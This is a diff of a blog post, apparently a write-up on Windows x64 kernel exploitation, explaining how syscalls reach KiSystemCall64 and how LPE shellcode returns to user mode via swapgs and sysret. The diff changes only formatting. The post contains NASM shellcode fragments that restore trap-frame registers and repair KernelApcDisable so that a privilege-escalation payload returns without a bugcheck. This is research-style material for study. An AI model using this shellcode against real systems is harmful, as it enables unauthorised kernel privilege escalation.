@@ -27,7 +27,8 @@ The most common way for user mode to interact with kernel code is by **issuing a
 Moreover, in high probability that's where our abusable kernel vulnerability will be at (in case of LPE) so we will assume our shellcode runs in a context of a system call.  
 There are two ways to issue a system call - the `syscall` and the `int 2e` opcodes.  
 The choice is based on the _SystemCall_ field in the _SharedUserData_ struct.  
-![](/assets/images/sysret_shellcode/ntdll_systemcall.jpg)
+![](/assets/images/sysret_shellcode/ntdll_systemcall_small.jpg)
+
 I'll say that it's safe to assume the `syscall` instruction will be used unless one of the following conditions apply:
 * The system is 32bit (`syscall` is long mode instruction)
 * Credential Guard feature is enabled - because it's virtualization based and the hypervisor can handle the `int` instruction better  
@@ -67,9 +68,10 @@ __writemsr(MSR_CSTAR, x86SyscallHandler);
 __writemsr(MSR_LSTAR, x64SyscallHandler);
 __writemsr(MSR_SYSCALL_MASK, 0x4700ui64);
 ```
+
 We're interested in how the kernel handles syscalls, so if KPTI is enabled we're interested in the `KiSystemCall64Shadow` function, otherwise it's `KiSystemCall64`.
 We'll focus on the non-KPTI implementation here - the `KiSystemCall64` function.  
-</br>
+<br />
 
 ### KiSystemCall64
 First, the function executes `swapgs` - this lets the kernel use the `gs` register to access important kernel structures.  
@@ -80,7 +82,8 @@ After `KiSystemCall64` saves the trap frame (with the help of the `gs` register)
 
 Now that we mostly understand what happens when a `syscall` is dispatched from usermode all the way up to kernelmode, we're interested in how the kernel reverts back to usermode.  
 Therefore, a point of interest is the function's exit points, like this one:  
-![](/assets/images/sysret_shellcode/KiSystemCall64_end.jpg)
+![](/assets/images/sysret_shellcode/KiSystemCall64_end_small.jpg)
+
 Specifically it's using `sysret` and that's what we're expecting after we've performed `syscall`.  
 We see it's setting the registers _rax, r8, r9, rcx, r11, rbp, rsp_ from some struct and zeroing _edx_ and _xmm_ registers.  
 The _rdx, r8, r9, and xmm1-xmm5_ registers are [considered volatile](https://docs.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-160) so their value isn't really meaningful and we can ignore them.  
@@ -124,19 +127,20 @@ system_process_loop:
 Now let's add what we know:
 ```nasm
 	mov rax, [gs:0x188]		; _KPCR.Prcb.CurrentThread
-	mov rdx, [rax + 0x90] 	; ETHREAD.TrapFrame
-	mov rcx, [rdx + 0x168]	; ETHREAD.TrapFrame.Rip
-	mov r11, [rdx + 0x178]	; ETHREAD.TrapFrame.EFlags
-	mov rsp, [rdx + 0x180]	; ETHREAD.TrapFrame.Rsp
-	mov rbp, [rdx + 0x158]	; ETHREAD.TrapFrame.Rbp
+	mov rdx, [rax + 0x90] 		; ETHREAD.TrapFrame
+	mov rcx, [rdx + 0x168]		; ETHREAD.TrapFrame.Rip
+	mov r11, [rdx + 0x178]		; ETHREAD.TrapFrame.EFlags
+	mov rsp, [rdx + 0x180]		; ETHREAD.TrapFrame.Rsp
+	mov rbp, [rdx + 0x158]		; ETHREAD.TrapFrame.Rbp
 	xor edx, edx			; Like KiSystemCall64 does
-	xor eax, eax 	        ; return STATUS_SUCCESS to NtDeviceIoControlFile 
+	xor eax, eax 	        	; return STATUS_SUCCESS to NtDeviceIoControlFile 
 	swapgs
-	o64 sysret	; nasm syntax shit
+	o64 sysret		; nasm syntax shit
 ```
 
 Running this gave a really not surprising result - a Blue Screen:  
 ![](/assets/images/sysret_shellcode/apc_mismatch_small.jpg)
+
 More specifically, it's a Bug Check 0x1: [APC_INDEX_MISMATCH](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/bug-check-0x1--apc-index-mismatch).  
 The documentation's Remarks section suggested it's because a call to `KeEnterCriticalRegion` didn't have a matching call to `KeLeaveCriticalRegion`.  
 By looking at the disassembly of `KeLeaveCriticalRegion` ([or the source code](https://github.com/cryptoAlgorithm/nt5src/blob/daad8a087a4e75422ec96b7911f1df4669989611/Source/XPSP1/NT/base/ntos/inc/ke.h#L1740)) it's pretty simple - just add one to `CurrentThread->KernelApcDisable`:  
@@ -146,6 +150,7 @@ mov cx, [rax + 0x1e4]		; KTHREAD.KernelApcDisable
 inc cx
 mov [rax + 0x1e4], cx
 ```
+
 **And that's it! It just works :)**  
 A weird quirk about it is that when I'm trying to exit the shell it's stuck for some reason. I don't know why, as I've not spent much time debugging it, because it's possible to terminate the _cmd.exe_ and its _conhost.exe_ externally with no problem.  
 <br/>  
